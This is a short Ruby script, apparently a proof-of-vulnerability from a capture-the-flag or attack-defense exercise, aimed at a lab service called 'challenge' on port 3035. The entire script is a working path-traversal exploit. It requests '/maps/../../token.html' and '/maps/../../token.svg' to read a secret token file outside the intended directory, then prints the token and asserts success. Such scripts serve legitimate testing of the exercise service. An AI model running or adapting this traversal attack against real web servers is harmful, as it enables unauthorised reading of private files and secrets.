#!/bin/env ruby

require "logger"

require 'securerandom'

require "mechanize"

LLL = Logger.new(STDERR,
                 formatter: proc do |sev, datetime, progname, msg|
                   "#{sev}: #{msg}\n"
                 end)

# seconds to wait for a given activity
DEFAULT_TIME_LIMIT = 5

# times to try some requests
PROCESS_ATTEMPTS = 5

# time between attempts
WAIT_BETWEEN_ATTEMPTS = PROCESS_ATTEMPTS / (2.0 + DEFAULT_TIME_LIMIT)

UUID_REGEXP = /([0-9a-f]{8}\-[0-9a-f]{4}\-[0-9a-f]{4}\-[0-9a-f]{4}\-[0-9a-f]{12})/

class Pov
  attr_reader :host, :port


  def initialize
    @host = ENV['HOST'] || 'challenge'
    @port = ENV['PORT'] || '3035'

    @base_uri = URI "http://#{@host}:#{@port}/"
  end

  def run!
    success_count = 0
    Mechanize.start do |agent|
      agent.follow_redirect = false
      agent.agent.allowed_error_codes = [404, 425]

      map_page_uri = @base_uri.dup
      map_page_uri.path = '/maps/../../token.html'

      map_page = agent.get map_page_uri

      if map_page && '200' == map_page.code && map_page.css('.svg_content')
        LLL.info "from the html page..."
        puts "TOKEN=#{map_page.css('.svg_content').text}"
        success_count += 1
      else
        LLL.error map_page.inspect
      end
      
      svg_page_uri = @base_uri.dup
      svg_page_uri.path = '/maps/../../token.svg'

      svg_page = agent.get svg_page_uri

      if svg_page && '200' == svg_page.code
        LLL.info "from the svg file..."
        puts "TOKEN=#{svg_page.body}"
        success_count += 1
      else
        LLL.error svg_page.inspect
      end
    end

    assert(success_count > 0,
      'expected at least one success')
  end

  private

  def assert_equal(expected, actual)
    assert(expected == actual, "expected #{expected} to == #{actual}")
  end

  def assert(predicate, message='failed assertion')
    return if predicate
    fail message
  end
end

pov = Pov.new
at_exit do
  LLL.info((["ruby", $0] + ARGV).join(' '))
end
pov.run!

LLL.info "success :)"
